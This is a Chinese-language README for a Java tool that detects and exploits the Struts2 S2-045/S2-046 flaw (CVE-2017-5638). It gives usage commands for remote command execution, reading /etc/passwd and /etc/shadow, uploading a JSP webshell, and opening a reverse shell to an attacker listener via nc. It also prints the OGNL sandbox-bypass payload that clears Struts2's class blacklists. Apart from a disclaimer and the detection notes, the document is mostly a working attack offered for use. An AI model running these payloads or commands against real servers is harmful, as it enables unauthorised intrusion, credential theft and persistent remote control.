# Struts2 漏洞检测与利用工具 (s2tool)

一个**纯 Java** 实现的 Struts2 S2-045 / S2-046（CVE-2017-5638）漏洞检测与利用工具。
检测模块覆盖 S2-045 / S2-046 两个漏洞，
利用模块提供命令执行、文件管理、信息获取、交互式 Shell、反弹 Shell、Webshell 上传等能力。

> **免责声明**：本工具仅用于授权的安全测试、漏洞研究与教学目的。
> 严禁用于未授权的非法用途，使用者需自行承担一切法律责任。

---

## 功能总览

| 模块              | 子命令        | 说明                                        |
| --------------- | ---------- | ----------------------------------------- |
| **漏洞检测**        | `scan`     | 检测 S2-045 / S2-046（数学验证 + UUID 指纹标记）      |
| **批量扫描**        | `batch`    | 批量检测多个目标，输出汇总与 JSON 报告                    |
| **命令执行**        | `exec`     | 任意系统命令执行 + 回显（自动适配 Win/Linux）             |
| **交互式 Shell**   | `shell`    | 持续交互，`cd` 目录持久化、`pwd`/`webroot`/`os` 内建命令 |
| **文件上传**        | `upload`   | OGNL 直写（小文件）/ 命令分段写入（大文件）                 |
| **文件下载**        | `download` | Base64 编码下载（二进制安全）                        |
| **Web 根目录**     | `getpath`  | 获取 Web 应用物理部署路径                           |
| **系统信息**        | `sysinfo`  | OS / 用户 / 内核 / 工作目录信息                     |
| **反弹 Shell**    | `revshell` | 一键反弹 bash / PowerShell Shell              |
| **Webshell 上传** | `webshell` | 生成并上传 JSP Webshell（明文 `?CMD=` 风格）         |
| **报告导出**        | `scan -r`  | JSON / HTML 报告                            |

> 下载功能可读取服务器任意文件（如 `/etc/shadow`），请仅在授权测试中使用。

---

## 快速开始

### 环境要求

- JDK 8 及以上版本
- Maven 3.x（仅构建时需要，运行工具无需安装 Maven）

### 构建（Windows）

```bat
:: 在项目目录执行
.\build.bat
```

> PowerShell 中需带 `.\` 前缀；cmd 中可直接 `build.bat`。
> build.bat 只负责构建，不会发起任何网络请求或扫描。
> 构建完成后窗口保持打开并进入 cmd 会话（可直接运行工具命令，输入 `exit` 关闭）。
> 若你的环境无法写入 Maven 默认仓库，可先设置环境变量 `M2_REPO` 指向可写目录。

产物：`target\s2tool.jar`（fat-jar）。

> Linux/Mac 用户可参考 `build.sh`（作者仅在 Windows 上开发测试，脚本未在
> Linux/Mac 上验证，如使用请自行确认）。

### 使用示例

```bash
# 1. 漏洞检测
java -jar s2tool.jar scan http://target/action

# 2. 检测 + 导出 JSON/HTML 报告
java -jar s2tool.jar scan http://target/action -r both

# 3. 命令执行
java -jar s2tool.jar exec http://target/action whoami
java -jar s2tool.jar exec http://target/action "cat /etc/passwd | head -5"

# 4. 交互式 Shell
java -jar s2tool.jar shell http://target/action

# 5. 获取 Web 根目录 / 系统信息
java -jar s2tool.jar getpath http://target/action
java -jar s2tool.jar sysinfo http://target/action

# 6. 上传 / 下载文件
java -jar s2tool.jar upload http://target/action shell.jsp /usr/local/tomcat/webapps/ROOT/shell.jsp
java -jar s2tool.jar download http://target/action /etc/passwd ./passwd.txt

# 7. 一键上传 Webshell（明文 ?CMD= 风格）
java -jar s2tool.jar webshell http://target/action --name shell.jsp
# 访问: http://target/shell.jsp?CMD=whoami

# 8. 反弹 Shell（攻击机先监听: nc -lvnp 4444）
java -jar s2tool.jar revshell http://target/action --lhost 192.168.1.100 --lport 4444

# 9. 批量扫描
java -jar s2tool.jar batch targets.txt -r json
```

### 批量目标文件格式

```
# 注释行以 # 开头（自动忽略）
http://192.168.1.10:8080/login.action
https://vuln.example.com/action
```

---

## 技术原理

### S2-045 / S2-046（CVE-2017-5638）

**官方公告的版本范围**（两个漏洞均依据 Apache 官方公告声明，供使用者评估目标是否受影响）：

| 漏洞         | CVE           | 受影响版本（有漏洞的版本）                                                   | 修复版本（打了补丁的版本）         |
| ---------- | ------------- | --------------------------------------------------------------- | --------------------- |
| **S2-045** | CVE-2017-5638 | Struts2 2.3.5 ~ 2.3.31、2.5 ~ 2.5.10                             | 2.3.32 或 2.5.10.1 及以上 |
| **S2-046** | CVE-2017-5638 | Struts2 2.3.5 ~ 2.3.31、2.5 ~ 2.5.10 | 2.3.32 或 2.5.10.1 及以上 |

> 本工具**不依赖版本号判断**，直接通过 Payload 探测结果判定漏洞是否存在，
> 因为版本识别不可靠（很多站点隐藏版本号）。上表仅供你人工评估时参考，
> 不影响工具检测逻辑。
> 
> 对 S2-046，工具同时支持 filename 空字节注入和 Content-Type 同根因两种检测路径。

**漏洞原理**：

- **触发点相同**：Jakarta Multipart 解析器解析异常时，将用户可控的请求头内容
  （S2-045：`Content-Type`；S2-046：`Content-Disposition` 的 filename）拼入异常消息，
  异常消息经 Struts2 国际化文本处理流程（`TextParseUtil.translateVariables`）被 **OGNL 求值**
- **利用方式不同**：S2-045 通过非法 Content-Type 触发；S2-046 通过 filename 空字节
  （需 commons-fileupload 1.3.3+）或超大 Content-Length（需 jakarta-stream 配置）触发

### 沙箱绕过

```ognl
(#nike='multipart/form-data')                       // 伪装 Content-Type，通过 contains 检查
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)       // 获取最高权限 MemberAccess
(#_memberAccess?(#_memberAccess=#dm):               // 低版本：直接替换
  ((#container=#context['com.opensymphony.xwork2.ActionContext.container'])
   (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))
   (#ognlUtil.getExcludedPackageNames().clear())     // 清空包名黑名单
   (#ognlUtil.getExcludedClasses().clear())          // 清空类黑名单
   (#context.setMemberAccess(#dm))))                 // 高版本：清黑名单后替换
```

> **实测**：Struts2 2.3.30 上精简版（仅 `setMemberAccess`）无法绕过沙箱，
> 必须使用完整版（含 OgnlUtil 清黑名单路径）。

### 检测策略

| 技术        | 原理                                               | 说明           |
| --------- | ------------------------------------------------ | ------------ |
| 数学运算验证    | OGNL 执行 `88888888-23333+1222`，响应含 `88866777` 即存在 | 公开 POC 算式    |
| UUID 指纹标记 | 注入随机 UUID 并回显到响应体                                | 高精度，不受网络延迟影响 |
| 延时检测      | `Thread.sleep(6000)` 时间差（仅 S2-045 无回显兜底）         | 阈值 >3.6s     |

判定规则：数学验证或指纹标记任一命中 → **确认存在**；仅延时命中 → **疑似存在**；
全部未命中 → **不存在**。

---

## 项目结构

```
struts2-vuln-tool/
├── pom.xml                        # Maven 构建（shade 打包 fat-jar）
├── build.bat / build.sh           # 构建脚本（Windows 已验证 / Linux 参考）
├── src/main/java/com/s2tool/
│   ├── Launcher.java              # 主入口（Picocli CLI）
│   ├── core/                      # 核心引擎：HTTP 客户端 / Payload 构造 / 响应分析 / 目标解析
│   ├── plugins/                   # 漏洞插件架构（扩展点）
│   │   └── impl/                  #   S2_045 / S2_046 检测插件
│   ├── modules/                   # 功能模块：检测调度 / 指纹识别 / 命令执行 / 文件管理 / Shell 等
│   ├── report/                    # 报告生成（控制台 / JSON / HTML）
│   └── utils/                     # 日志工具
├── src/main/resources/            # 日志配置 / Payload 参考
└── src/test/                      # JUnit 单元测试
```

---

## 参考

**漏洞原理与技术文章：**

- [Apache Struts S2-045 官方公告 (CVE-2017-5638)](https://cwiki.apache.org/confluence/display/WW/S2-045)
- [S2-045 OGNL 注入与三重沙箱绕过分析（腾讯云开发者社区）](https://cloud.tencent.cn/developer/article/2667927)(Payload参考)
- [S2-046 漏洞原理分析（安全客）](https://www.anquanke.com/post/id/85776)

**参考的开源项目（本项目开发中参考了以下仓库的思路与 Payload）：**

- [Flyteas/Struts2-045-Exp](https://github.com/Flyteas/Struts2-045-Exp)
  —— 命令执行 / 获取 Web 根目录 / JSP 写文件 Payload 模板
- [Z-0ne/ScanS2-045-Nmap](https://github.com/Z-0ne/ScanS2-045-Nmap)
  —— 批量检测思路、响应特征标记方式
- [abc123info/Struts2VulsScanTools](https://github.com/abc123info/Struts2VulsScanTools)
  —— 多漏洞检测工具的整体设计思路（检测与利用分离）

---

## License

仅限授权安全测试与学习研究使用。

严禁用于未授权的非法用途，使用者需自行承担一切法律责任。
